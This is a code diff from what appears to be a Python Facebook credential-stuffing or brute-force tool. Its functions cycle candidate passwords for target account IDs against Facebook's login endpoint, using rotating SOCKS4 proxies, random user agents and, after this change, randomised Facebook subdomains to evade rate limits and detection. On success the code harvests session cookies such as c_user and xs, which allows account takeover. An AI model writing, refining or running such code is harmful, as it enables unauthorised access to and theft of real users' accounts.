@@ -700,10 +700,10 @@ def m1(ids,pwv):
     nip=random.choice(proxsi)
     proxs= {'http': 'socks4://'+nip}
     ua = ua_valid()
-    DOMAIN = ("m","business","mbasic","p","login")
+    DOMAIN = ("m","business","mbasic","p")
     fb= random.choice(DOMAIN)
-    warna = random.choice(my_color)
     uger = random.choice(ugrn)
+    warna = random.choice(my_color)
     try:
         for pas in pwv:
             free_fb = session.get(f'https://free.facebook.com').text
@@ -784,9 +784,12 @@ def m2(ids,pwv):
     warna = random.choice(my_color)
     nip=random.choice(proxsi)
     proxs= {'http': 'socks4://'+nip}
+    DOMAIN = ("m","business","mbasic","p")
+    fb= random.choice(DOMAIN)
+    uger = random.choice(ugrn)
     try:
         for pas in pwv:
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get(f'https://{fb}.facebook.com').text
             info={
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -798,7 +801,7 @@ def m2(ids,pwv):
             "pass":pas,
             "login":"Log In"}
             update={
-            'authority': 'm.facebook.com',
+            'authority': f'{fb}.facebook.com',
             'method': 'GET',  # Assuming this is a GET request
             'path': '/',      # Assuming this is the path of the request
             'scheme': 'https',
@@ -806,8 +809,8 @@ def m2(ids,pwv):
             'accept-language': 'es-MX,es;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '2.75',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/?locale2=en_GB',
+            'origin': f'https://{fb}.facebook.com',
+            'referer': f'https://{fb}.facebook.com/?locale2=en_GB',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
             'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
@@ -818,13 +821,13 @@ def m2(ids,pwv):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
+            'user-agent': uger,
             'viewport-width': '393',
             'x-asbd-id': '129477',
             'x-fb-lsd': 'AVq9MsDYu_k',
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream'}
-            session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',data=info,headers=update,proxies=proxs).text
+            session.post(f'https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',data=info,headers=update,proxies=proxs).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
